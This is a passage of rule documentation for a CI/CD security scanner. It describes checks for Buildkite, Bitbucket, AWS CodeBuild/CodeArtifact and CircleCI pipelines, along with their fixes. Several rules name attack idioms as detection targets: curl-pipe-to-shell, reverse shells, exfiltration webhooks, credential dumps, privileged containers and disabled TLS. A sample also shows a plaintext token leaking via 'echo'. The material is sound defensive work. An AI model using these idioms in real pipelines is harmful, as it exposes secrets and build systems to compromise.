- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`BB-025`](../providers/bitbucket.md#bb-025) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-026`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-026 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Complements BB-002 (script injection from untrusted PR context). This rule fires on intrinsically risky idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`BB-026`](../providers/bitbucket.md#bb-026) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-027 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Complements BB-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`BB-027`](../providers/bitbucket.md#bb-027) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BK-001`: Buildkite plugin not pinned to an exact version <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Buildkite resolves plugin refs at agent boot. ``foo#v1.2.3`` locks the version; ``foo#main`` / ``foo`` does not. Detection fires on bare names, branch keywords, and partial-semver pins (``v4``, ``v4.13``).

**Recommendation.** Pin every plugin reference to an exact tag (``docker-compose#v4.13.0``) or a 40-char commit SHA. Bare references (``docker-compose``), branch refs (``#main`` / ``#master``), and major-only floats (``#v4``) resolve to whatever is current at agent start time, which lets a compromised plugin release execute inside the pipeline.

**Source:** [`BK-001`](../providers/buildkite.md#bk-001) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-002`: Literal secret value in pipeline env block <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-002 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Detection fires on values that look like AWS access keys, GitHub PATs, OpenAI keys, JWTs, or generic high-entropy tokens, plus on env-var names that imply a secret (``*_TOKEN``, ``*_KEY``, ``*PASSWORD``, ``*SECRET``) when the value is a non-empty literal rather than an interpolation (``$SECRET_FROM_AGENT_HOOK``).

**Recommendation.** Move the value out of the pipeline file. Use Buildkite's agent secrets hooks (``secrets/`` directory or ``BUILDKITE_PLUGIN_AWS_SSM_*``), the ``aws-ssm`` / ``vault-secrets`` plugins, or the ``BUILDKITE_PIPELINE_DEFAULT_BRANCH`` env var pulled from a secret manager. The pipeline.yml is committed to the repo and visible to anyone with read access.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Names that imply a secret but actually store a non-sensitive identifier flag here: ``CACHE_KEY: build-2024-Q4``, ``API_KEY_PATH: /var/run/secrets/api``, ``SECRET_NAME: my-vault-secret``. The rule has no way to tell from the name + literal alone whether the value is the credential or merely a reference to one. Also: deliberate test fixtures and documentation snippets that embed canonical example values (``AKIAIOSFODNN7EXAMPLE``) match the strong-pattern set; this is intentional, real-world copies of those example literals usually mean a docs paste was never substituted.

**Source:** [`BK-002`](../providers/buildkite.md#bk-002) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-003`: Untrusted Buildkite variable interpolated in command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-003 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Buildkite passes branch / tag / message metadata as environment variables. Putting them inside ``$(...)`` or shelling out with the value unquoted is a classic command-injection vector. The detection fires on the unquoted interpolation form and on use inside ``eval`` / ``$(...)``.

**Recommendation.** Don't interpolate ``$BUILDKITE_BRANCH``, ``$BUILDKITE_TAG``, ``$BUILDKITE_MESSAGE``, ``$BUILDKITE_PULL_REQUEST_*``, or ``$BUILDKITE_BUILD_AUTHOR*`` directly into shell commands. These come from the pull request / branch and are attacker-controllable. Quote them and assign to a local variable first (``branch="$BUILDKITE_BRANCH"; ./script --branch "$branch"``), or pass them as arguments to a script you own.

**Known false positives.**

- The single-token double-quoted form (``"$BUILDKITE_BRANCH"``) is already excluded; multi-token shell snippets that *look* unquoted but are consumed safely by the downstream tool (e.g. a ``./script.sh $BUILDKITE_BRANCH`` where the script treats argv as data and never re-evaluates) still flag. The rule has no AST-level understanding of the called script, suppress per-step via ``--ignore-file`` once you've verified the script handles untrusted argv safely (or quote the use, which is the better fix).

**Source:** [`BK-003`](../providers/buildkite.md#bk-003) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-004`: Remote script piped into shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-004 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection), [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** The detection fires on ``curl|bash``, ``curl|sh``, ``wget|bash``, ``iex (iwr ...)``, and the corresponding ``Invoke-WebRequest|Invoke-Expression`` PowerShell forms. Use ``curl -fsSLO <url>; sha256sum -c install.sh.sha256; bash install.sh`` instead.

**Recommendation.** Download the installer to disk, verify a checksum or signature, then execute it. ``curl ... | sh`` lets the remote host change what runs in your pipeline at any time, and any TLS / DNS error during download silently feeds a partial script to the shell.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-004`](../providers/buildkite.md#bk-004) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-005`: Container started with --privileged or host-bind escalation <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-005 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detection fires on ``--privileged``, ``--cap-add=SYS_ADMIN``, ``--pid=host`` / ``--ipc=host`` / ``--userns=host``, and explicit mounts of the host Docker socket (``/var/run/docker.sock``).

**Recommendation.** Drop ``--privileged``, ``--cap-add=SYS_ADMIN``, ``--pid=host``, and ``-v /var/run/docker.sock`` from container invocations. If the workload needs Docker-in-Docker, use a build-specific rootless option (``buildx``, ``kaniko``, ``buildah --isolation=chroot``) instead of opening the host kernel and the agent's Docker socket to the build script.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-005`](../providers/buildkite.md#bk-005) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-007`: Deploy step not gated by a manual block / input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-007 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** A step is treated as a deploy when its label, key, or any command line contains a deploy keyword (``deploy``, ``ship``, ``release``, ``promote``, ``apply``, ``rollout``, ``terraform apply``, ``kubectl apply``, ``helm upgrade``, ``aws ecs update-service``). The check passes when at least one preceding step in the same pipeline file is a ``block:`` or ``input:`` flow-control step.

**Recommendation.** Insert a ``- block: "Deploy?"`` (or ``- input:`` step) in front of every deploy step. Buildkite waits for a human to click *Unblock* before the gated steps run, which prevents an unreviewed merge from auto-deploying to production. Combine with ``branches: main`` so the gate only appears on release branches.

**Known false positives.**

- Pipelines where the deploy gate lives in a triggered pipeline rather than the local file, the local pipeline looks ungated even though the actual deploy is gated downstream. Add a no-op ``block:`` to silence.

**Source:** [`BK-007`](../providers/buildkite.md#bk-007) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-008`: TLS verification disabled in step command <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-008 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detection fires on the canonical bypass flags across curl, wget, git, npm, pip, gcloud, and openssl. The check is deliberately conservative, partial-word matches (``--insecure-protocols``) are excluded.

**Recommendation.** Drop ``curl -k`` / ``--insecure``, ``wget --no-check-certificate``, ``git -c http.sslVerify=false``, and ``pip install --trusted-host``. If a CA isn't trusted, install it into the agent's trust store (``update-ca-certificates``) rather than disabling validation pipeline-wide. A compromised intermediate that strips TLS gets a free hand with every fetch the step performs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-008`](../providers/buildkite.md#bk-008) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-009 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Unsigned artifacts can't be verified downstream, a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools, matching the shared signing-token catalog used by the other CI packs.

**Recommendation.** Add a signing step, install cosign once (``brew install cosign`` in the agent image, or a ``cosign-install`` plugin) and call ``cosign sign --yes <ref>`` after the build. For container images pushed to ECR / GCR / GHCR, the same call signs by digest. Publish the signature alongside the artifact and verify it at consumption time.

**Source:** [`BK-009`](../providers/buildkite.md#bk-009) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-010 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog, syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool.

**Recommendation.** Add an SBOM-generation step. ``syft <artifact> -o cyclonedx-json > sbom.json`` runs in any standard agent image; ``cyclonedx-cli`` and ``cdxgen`` are alternative producers. Upload the SBOM via ``buildkite-agent artifact upload`` so downstream consumers (and incident-response tooling) can match deployed artifacts to the components they were built from.

**Source:** [`BK-010`](../providers/buildkite.md#bk-010) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-011 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials, [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Without it, a leaked signing key forges identity but a leaked build environment also forges provenance. You need both for the SLSA L3 non-falsifiability guarantee. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``attest-build-provenance``).

**Recommendation.** Run ``cosign attest --predicate slsa.json`` (or the SLSA-framework generator from a build-time step) after the build completes. The predicate records the build inputs and the agent that produced the artifact. Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`BK-011`](../providers/buildkite.md#bk-011) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-012 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers ``does this artifact ship a known CVE?`` rather than ``can we verify what it is?``. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, anchore, dependency-check, checkov, semgrep.

**Recommendation.** Add a vulnerability scanner, ``trivy fs .`` for source / filesystem, ``trivy image <ref>`` for container images, ``grype`` and ``snyk`` for either. Add ``npm audit`` / ``pip-audit`` for language-specific dep audits. Fail the step on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`BK-012`](../providers/buildkite.md#bk-012) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-014`: Step commands run unpinned package installs <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-014 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detection reuses the cross-provider primitives ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from ``checks/base.py``. Same rule pack already exists for GHA (``GHA-021`` / ``GHA-022``), GitLab (``GL-021`` / ``GL-022``), Bitbucket / Azure DevOps / Jenkins / CircleCI / Cloud Build / Drone. Buildkite was a gap; this closes it.

Insecure variants (``PKG_INSECURE_RE``): ``pip --index-url http://``, ``pip --trusted-host``, ``npm --registry http://``, ``gem --source http://``, ``nuget --Source http://``, ``cargo --index http://``. Lockfile-bypass variants (``PKG_NO_LOCKFILE_RE``): ``npm install`` (should be ``npm ci``), bare ``pip install <pkg>`` without ``-r`` or ``--require-hashes``, ``yarn install`` without ``--frozen-lockfile``, ``bundle install`` without ``--frozen``, ``cargo install``, ``go install`` without an ``@vN.N`` pin, ``poetry install`` without ``--no-update``.

**Recommendation.** Pin every package install to a lockfile or a checksum-verified version. ``npm ci`` (not ``npm install``), ``yarn install --frozen-lockfile``, ``pip install -r requirements.txt --require-hashes``, ``bundle install --frozen``. Don't use ``--trusted-host`` / ``--no-verify`` / a non-HTTPS index URL — those bypass TLS or trust validation entirely (BK-008 covers the TLS subset; this rule covers the lockfile subset).

**Known false positives.**

- Bootstrap-stage installs that intentionally pull latest (``apt-get install -y curl`` for a tooling image rebuild) sometimes legitimately bypass the lockfile. Suppress via ignore-file scoped to the specific step label when this is the deliberate shape; the broader pinning policy still covers the rest of the pipeline.

**Source:** [`BK-014`](../providers/buildkite.md#bk-014) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-015`: agents map interpolates attacker-controllable Buildkite variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-015 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Buildkite uses an ``agents:`` map to route a step to a specific runner pool. Both the top-level ``agents:`` and the per-step override are scanned. Detection mirrors BK-003's tainted-variable list (``$BUILDKITE_BRANCH``, ``$BUILDKITE_TAG``, ``$BUILDKITE_MESSAGE``, ``$BUILDKITE_PULL_REQUEST_*``, ``$BUILDKITE_BUILD_AUTHOR*``, ``$BUILDKITE_COMMIT``). The pattern matches what GHA-036, GL-032, JF-032, ADO-030, and CC-031 already enforce on the other CI providers; closes parity for Buildkite.

Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fire (Buildkite doesn't shell-eval the agents map anyway, but the value still substitutes), only the unquoted single-token interpolation does.

**Recommendation.** Pin every ``agents:`` map entry to a static literal that matches your runner targeting policy. ``queue: linux-amd64`` or ``os: linux`` is fine; ``queue: $BUILDKITE_BRANCH`` is not, because the pusher can route their build to whichever agent pool they want, including a privileged pool reserved for the deploy step. Production runner pools should also carry a tag the agent itself enforces (e.g. ``buildkite-agent start --tags 'queue=production'`` plus a queue-allow-list on the API token), so the rule is one layer of a defense-in-depth posture.

**Known false positives.**

- Some teams use a static prefix plus a CI-controlled tail (``queue: build-$BUILDKITE_PIPELINE_SLUG``) to share an agent pool across pipelines. ``BUILDKITE_PIPELINE_SLUG`` is not pusher-controllable so it isn't on the tainted list, but if your team has its own conventions for trusted Buildkite vars, suppress on the specific step.

**Source:** [`BK-015`](../providers/buildkite.md#bk-015) in the [Buildkite provider](../providers/buildkite.md).

#### `CA-001`: CodeArtifact domain not encrypted with customer KMS CMK <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ca-001 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** AWS-owned encryption (the default ``alias/aws/codeartifact`` key) keeps the key policy under AWS's control, not yours. That's fine for confidentiality but means cross-account auditability of every Decrypt event lives with AWS, and you can't revoke or scope key access without recreating the domain. A customer-managed CMK puts both controls back in your hands.

**Recommendation.** Recreate the CodeArtifact domain with an encryption-key argument pointing at a customer-managed CMK. Domain encryption is set at creation and cannot be changed after.

**Source:** [`CA-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CA-002`: CodeArtifact repository has a public external connection <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ca-002 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** An external connection to ``public:npmjs`` / ``public:pypi`` / ``public:nuget`` / ``public:maven-central`` fetches packages from the public registry on first resolution. A typo-squat (``request`` vs ``requests``) or a compromised upstream lands in the cache the first time anyone names it; every subsequent build pulls the cached substitute. The pull-through cache with an allow-list is the same risk shape solved by an explicit allowlist.

**Recommendation.** Route public package consumption through a pull-through cache repository governed by an allow-list of package names, and point build-time repos at that cache rather than directly at ``public:npmjs``/``public:pypi``. Unscoped public upstreams expose builds to dependency-confusion and typosquatting attacks.

**Source:** [`CA-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CA-004`: CodeArtifact repo policy grants codeartifact:* with Resource '*' <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ca-004 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** ``codeartifact:*`` on ``Resource: '*'`` collapses the entire repository's authority into one grant: the holder can read, write, delete, dispose, and re-publish every package. Even for a service principal that nominally only consumes packages, the grant lets a compromise of that consumer rewrite every dependency the team relies on.

**Recommendation.** Scope Allow statements to specific ``codeartifact:`` actions (e.g. ``codeartifact:ReadFromRepository``) and to specific package-group ARNs. Wildcard action + wildcard resource is the classic over-broad grant that lets a consumer also publish.

**Source:** [`CA-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-001`: Secrets in plaintext environment variables <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cb-001 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Flags a plaintext env var when either (a) its **name** matches a secret-like pattern (PASSWORD, TOKEN, API_KEY, ...) or (b) its **value** matches a known credential shape (AKIA/ASIA access keys, GitHub tokens, Slack xox* tokens, JWTs). Plaintext values are visible in the AWS console, CloudTrail, and build logs to anyone with read access.

**Recommendation.** Move secrets to AWS Secrets Manager or SSM Parameter Store and reference them using type SECRETS_MANAGER or PARAMETER_STORE in the CodeBuild environment variable configuration.

**Proof of exploit.**

# Vulnerable: CodeBuild project with a plaintext PAT in env.
{
  "name": "deploy",
  "environment": {
    "environmentVariables": [
      {"name": "GITHUB_TOKEN",
       "value": "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
       "type": "PLAINTEXT"}
    ]
  }
}

# Exposure surface (no exploit needed, the value just leaks):
#  - codebuild:BatchGetProjects returns the value to anyone with
#    that permission (often broader than `codebuild:StartBuild`).
#  - CloudTrail's UpdateProject / CreateProject events record
#    the full env block in audit logs.
#  - The buildspec can ``echo $GITHUB_TOKEN`` and the value
#    lands in the build log group, readable by anyone with
#    logs:GetLogEvents on the group.
#  - The AWS console shows the value to anyone with project
#    read access; no separate decrypt permission gates it.

# Safe: reference Secrets Manager / SSM, never store the
# plaintext on the project.
{
  "name": "deploy",
  "environment": {
    "environmentVariables": [
      {"name": "GITHUB_TOKEN",
       "value": "arn:aws:secretsmanager:us-east-1:111111111111:secret:gh-pat-AbCdEf",
       "type": "SECRETS_MANAGER"}
    ]
  }
}

**Source:** [`CB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-005`: Outdated managed build image <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-005 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Only AWS-managed ``aws/codebuild/standard:N.0`` images are version-checked. Custom or third-party images pass here, CB-009 handles the separate concern of tag vs digest pinning for custom images.

**Recommendation.** Update the CodeBuild environment image to aws/codebuild/standard:7.0 or later to ensure the build environment receives the latest security patches.

**Known false positives.**

- One version behind the current ``aws/codebuild/standard`` is a hygiene warning, not a production issue, and defaults to MEDIUM confidence. The rule emits HIGH only when the project is two or more versions behind. Custom or third-party images are not version-checked here; CB-009 handles tag-vs-digest pinning for those.

**Source:** [`CB-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-006`: CodeBuild source auth uses long-lived token <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-006 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** OAUTH / PERSONAL_ACCESS_TOKEN / BASIC_AUTH source credentials are stored long-lived on the account and used by every CodeBuild project that points at the SCM provider. Rotating the upstream PAT requires manual re-credentialing here too. CodeConnections (CodeStar) is the AWS-managed alternative with token refresh and revocation.

**Recommendation.** Switch to an AWS CodeConnections (CodeStar) connection and reference it from the source configuration. Delete any stored source credentials of type OAUTH, PERSONAL_ACCESS_TOKEN, or BASIC_AUTH via delete_source_credentials.

**Source:** [`CB-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-008`: CodeBuild buildspec is inline (not sourced from a protected repo) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-008 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** An inline buildspec (source.buildspec set to YAML text, or a S3 URL) bypasses the protections that cover your source code. A user with ``codebuild:UpdateProject`` can rewrite the build commands without touching the repository, no PR review, no branch protection, no audit of what changed. Store buildspec.yml in the repo instead.

**Recommendation.** Remove the inline buildspec and store buildspec.yml in the source repository under branch protection. Anyone with codebuild:UpdateProject can silently rewrite an inline buildspec; repository-sourced buildspecs inherit the repo's review and protection controls.

**Source:** [`CB-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-009`: CodeBuild image not pinned by digest <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-009 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** CodeBuild pulls the environment image on every build. A tag pointer can be moved by whoever controls the registry; a digest cannot. AWS-managed ``aws/codebuild/...`` images are exempt. Those are covered by CB-005 and are not part of the tag-mutation threat model.

**Recommendation.** Pin custom CodeBuild images by ``@sha256:<digest>``. Tag-based references (``:latest``, ``:1.2.3``) can be silently overwritten to point at a malicious layer that is pulled on the next build.

**Source:** [`CB-009`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-010`: CodeBuild webhook allows fork-PR builds without actor filtering <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-010 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** GitHub/Bitbucket webhook filter groups that fire on pull-request events will build forks by default. Because CodeBuild runs with the project's own IAM role (not the PR author's), a fork PR can execute arbitrary code with CI privileges and exfiltrate secrets. Restrict to known contributors with an ``ACTOR_ACCOUNT_ID`` pattern group.

**Recommendation.** Add an ``ACTOR_ACCOUNT_ID`` filter pattern to every webhook filter group that accepts ``PULL_REQUEST_CREATED`` / ``PULL_REQUEST_UPDATED`` / ``PULL_REQUEST_REOPENED``, or remove those PR event types. Without actor filtering, any fork can trigger a build that runs with the project's service role.

**Source:** [`CB-010`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CB-011`: CodeBuild buildspec contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cb-011 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Scans the ``source.buildspec`` text on every CodeBuild project for concrete attack indicators: reverse shells, base64-decoded execution, miner binaries/pools, Discord/Telegram webhooks, credential-dump pipes, audit-erasure commands. CB-011 is CRITICAL by design, a true positive is evidence of compromise, not a hygiene improvement. Repo-sourced buildspecs (not inlined) return ``NOT APPLICABLE`` because the text isn't visible to the scanner; CB-008 already flags the inline form as a governance gap.

**Recommendation.** Treat as a potential compromise. Identify which principal or pipeline ran the CodeBuild project recently, rotate its service role's credentials, audit CloudTrail for outbound activity to the matched hosts, and, if an inline buildspec is in use (CB-008), enforce repo-sourced buildspecs under branch protection so the next malicious edit requires a PR.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`CB-011`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CC-001`: Orb not pinned to exact semver <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Orb references in the `orbs:` block must include an `@x.y.z` suffix to lock a specific version. References without `@`, with `@volatile`, or with only a major (`@1`) or major.minor (`@5.1`) version float and can silently pull in malicious updates.

**Recommendation.** Pin every orb to an exact semver version (`circleci/node@5.1.0`). Floating references like `@volatile`, `@1`, or bare names without `@` resolve to whatever is latest at build time, allowing a compromised orb update to execute in the pipeline.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-001`](../providers/circleci.md#cc-001) in the [CircleCI provider](../providers/circleci.md).

#### `CC-002`: Script injection via untrusted environment variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-002 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** CircleCI exposes environment variables like `$CIRCLE_BRANCH`, `$CIRCLE_TAG`, and `$CIRCLE_PR_NUMBER` that are controlled by the event source (branch name, tag, PR). Interpolating them unquoted into `run:` commands allows shell injection via specially crafted branch or tag names.

**Recommendation.** Do not interpolate attacker-controllable environment variables (CIRCLE_BRANCH, CIRCLE_TAG, CIRCLE_PR_NUMBER, etc.) directly into shell commands. Pass them through an intermediate variable and quote them, or use CircleCI pipeline parameters instead.

**Source:** [`CC-002`](../providers/circleci.md#cc-002) in the [CircleCI provider](../providers/circleci.md).

#### `CC-003`: Docker image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-003 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Docker images referenced in `docker:` blocks under jobs or executors must include an `@sha256:...` digest suffix. Tag-only references (`:latest`, `:18`) are mutable and can be replaced at any time by whoever controls the upstream registry.

**Recommendation.** Pin every Docker image to its sha256 digest: `cimg/node:18@sha256:abc123...`. Tags like `:latest` or `:18` are mutable, a registry compromise or upstream push silently replaces the image content.

**Source:** [`CC-003`](../providers/circleci.md#cc-003) in the [CircleCI provider](../providers/circleci.md).

#### `CC-005`: AWS auth uses long-lived access keys in environment block <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-005 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Long-lived AWS access keys declared directly in a job's `environment:` block are visible to anyone who can read the config. They cannot be rotated automatically and remain valid until manually revoked. OIDC-based federation yields short-lived credentials per build.

